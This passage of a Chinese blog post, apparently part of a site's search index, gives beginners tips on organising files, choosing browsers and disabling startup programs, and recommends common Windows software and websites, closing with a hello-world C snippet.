title="关于文件分类"></a>关于文件分类</h3><ul><li>电脑上一切软件，包括操作系统都是由那几个盘里的文件构成的，因此学会整理文件不仅自己感到整齐，也可以方便我们查找，不增加混乱度。比如前面的下载软件单独到一个文件夹，还比如安装包下载到桌面用了就删掉，而不是让电脑默认下到C盘的某个不知名的角落占用内存等等。</li></ul><h3 id="关于浏览器"><a href="#关于浏览器" class="headerlink" title="关于浏览器"></a>关于浏览器</h3><ul><li>谷歌，火狐等浏览器都是不错的选择，但如果你不想下载，事实上win10自带的edge浏览器就是特别棒的选择！请一定不要单独下载什么360浏览器，2345浏览器等等。如果自己的主页被篡改了可以再网上搜索一下如何恢复edge默认主页。</li><li>edge浏览器占用少，速度快，并且干净整洁，并且有不少不错的插件功能。<br><img src="https://i.loli.net/2021/08/01/v93wWD7oykRKalx.png" alt="77.png"><br><img src="https://i.loli.net/2021/08/01/Lkbi1KO2qRHx3Np.png" alt="88.png"></li></ul><blockquote><p>Tips:如果你的电脑已经充满了这些杀毒软件，不好的浏览器，就从上面那一款卸载软件Geek Uninstaller的安装开始吧，然后卸载掉这些东西~</p></blockquote><h3 id="关于内存占用"><a href="#关于内存占用" class="headerlink" title="关于内存占用"></a>关于内存占用</h3><ul><li>净化开机启动项<br/><br>个别软件安装后默认加到开机启动里边，不仅拖慢开机速度，而且开机后默认启动到后台占用内存。<br/>打开任务管理器（CTRL+SHIFT+ESC）点击&lt;启动&gt;选项，禁用某些无关应用自启动，例如百度网盘等等。</li></ul><h2 id="软件推荐"><a href="#软件推荐" class="headerlink" title=" 软件推荐"></a><img src="https://i.loli.net/2021/08/02/KOYFXDysM8HetU9.png" alt="525.png"> 软件推荐</h2><blockquote><p>在这里推荐一些很好用的基础软件，如果你也有的话欢迎反馈。</p></blockquote><h3 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h3><blockquote><p>浏览器是我们使用频率最高的软件，有很多扩展功能值得去探索，也能大大提高效率，并且变得好看。</p></blockquote><ul><li><p>Microsoft Edge浏览器<br><br/>windows 10自带的浏览器，干净好用，推荐使用，不过请注意一定不要更换主页为360什么的，使用默认主页。</p></li><li><p>Google chrome浏览器 <a href="https://www.google.cn/intl/en_uk/chrome/">官网链接</a><br/><br>扩展性强，市场排名第一浏览器，调试功能强大</p></li><li><p>Firefox浏览器 <a href="https://www.firefox.com.cn/">官网链接</a><br/><br>开源自由，扩展多，特别好</p></li><li><p>Safari浏览器 <a href="https://www.apple.com.cn/safari/">官网链接</a><br/><br>苹果系统自带，当然Windows用户也可以使用。</p></li></ul><h3 id="杀毒软件"><a href="#杀毒软件" class="headerlink" title="杀毒软件"></a>杀毒软件</h3><ul><li>无</li><li>如果确实很想安装一个，那就要 火绒安全 <a href="https://www.huorong.cn/">官网链接</a> 吧。</li></ul><h3 id="清理软件"><a href="#清理软件" class="headerlink" title="清理软件"></a>清理软件</h3><ul><li>Ccleaner <a href="https://www.ccleaner.com/">官网链接</a><br/><br>如果卸载掉360安全卫士后你觉得没有清理软件了，那么这一款就是评价很高的清理软件，不过我没怎么用过，好像褒贬不一。</li></ul><h3 id="卸载软件"><a href="#卸载软件" class="headerlink" title="卸载软件"></a>卸载软件</h3><ul><li>Geek Uninstaller <a href="https://geekuninstaller.com/">官网链接</a><br/><br>前面介绍过了，直接安装就好。</li></ul><h3 id="压缩软件"><a href="#压缩软件" class="headerlink" title="压缩软件"></a>压缩软件</h3><ul><li><p>360zip <a href="https://yasuo.360.cn/">官网链接</a><br/><br>电脑里必备一款压缩软件，以后需要用到，虽然很多其他的360软件有点难用，但360zip确实很好，无广告，轻量好用。</p></li><li><p>7-zip 或者 bandzip<br/><br>也有推荐这两款的，不过我的360zip的确很好用，所以没下过这两个，但是口碑也还不错。</p></li></ul><h3 id="播放器"><a href="#播放器" class="headerlink" title="播放器"></a>播放器</h3><ul><li>PotPlayer <a href="http://www.potplayercn.com/PotPlayer.html">官网链接</a><br/><br>如果要播放本地视频，请不要选择爱奇艺播放器，这款软件值得，功能强大，界面简洁清爽，无广告，配置选项丰富~</li></ul><h3 id="检索软件"><a href="#检索软件" class="headerlink" title="检索软件"></a>检索软件</h3><ul><li>everything <a href="https://www.voidtools.com/zh-cn/downloads/">官网链接</a><br/><br>一个字：超级强大！该款软件检索文件速度比Windows自带的检索速度快了不知多少倍，并且支持正则表达式等高级搜索功能，强烈推荐。 <br/><blockquote><p>Tips:下载x64位版本的哦，不要下错啦，可以选 &lt;安装版64位&gt;</p></blockquote></li></ul><h3 id="下载软件"><a href="#下载软件" class="headerlink" title="下载软件"></a>下载软件</h3><ul><li>IDM <a href="https://www.internetdownloadmanager.com/">官网链接</a><br/><br>大多数小软件可以直接在官网下载，这款软件的功能主要是提升下载速度，尤其是软件很大的时候优势很明显，只不过操作起来稍稍复杂点。</li></ul><h2 id="网站推荐"><a href="#网站推荐" class="headerlink" title=" 网站推荐"></a><img src="https://i.loli.net/2021/08/03/TZJIHAehx7zVDFR.png" alt="获取元素文本.png"> 网站推荐</h2><h3 id="软件工程常用的"><a href="#软件工程常用的" class="headerlink" title="软件工程常用的"></a>软件工程常用的</h3><ul><li>GitHub <a href="https://github.com/">官网链接</a><br/><br>全球最大开源交流社区，软件工程师必备，学弟学妹们可以早点注册一个，学习一下。网站速度有时候可能比较慢很正常的，有时候需要科学上网设备，同样有一个和GitHub类似的国内交流平台 码云<a href="https://gitee.com/">官网链接</a>。</li></ul><blockquote><p>github使用小技巧：在域名的github后面加上 1s 可以开启在线vscode浏览模式。<br><img src="https://i.loli.net/2021/08/06/93i1QpWYaLZqOtJ.png" alt="image.png"></p></blockquote><ul><li>sm.ms网站 <a href="https://sm.ms/">官网链接</a><br/><br>在写markdown或者前端页面需要插入图片时，如果引用互联网图片则需要该图片的url地址，该网站支持本地图片免费一键上传，并获取该图片的url或markdown地址，是写网页特别好的网站哦。</li></ul><h3 id="实用类"><a href="#实用类" class="headerlink" title="实用类"></a>实用类</h3><ul><li><p>阿里巴巴矢量图标库 <a href="https://www.iconfont.cn/">官网链接</a><br/><br>无论是做PPT还是以后可能接触到的前端页面，有需要使用各种图标或插画的时候，该网站是一个很不错的选择，有各种优质图标插画供免费下载。</p></li><li><p>HOTBOX　<a href="https://www.hotbox.fun/">官网链接</a><br/><br>支持各个网络平台的视频一键下载到本地。</p></li></ul><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Thank you for watching...&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> General Records </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
